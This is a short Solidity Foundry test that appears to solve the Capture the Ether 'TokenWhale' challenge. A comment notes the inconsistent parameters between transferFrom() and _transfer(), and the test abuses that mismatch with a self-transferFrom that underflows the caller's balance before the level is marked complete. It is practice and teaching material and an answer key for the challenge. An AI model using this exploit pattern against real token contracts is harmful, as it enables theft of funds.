pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/capture-the-ether/TokenWhale.sol";

// params passed into transferFrom() and _transfer() aren't consistent
contract TokenWhaleTest is Test {
    TokenWhale instance;
    address alice = makeAddr("alice");

    function setUp() public {
        instance = new TokenWhale(alice);
    }

    function test() public {
        assertFalse(instance.isComplete());

        vm.prank(alice);
        instance.approve(address(this), 1000);
        assertEq(instance.allowance(alice, address(this)), 1000);

        instance.transferFrom(alice, alice, 1000);
        instance.transfer(alice, 1000000);

        assertTrue(instance.isComplete());
    }
}
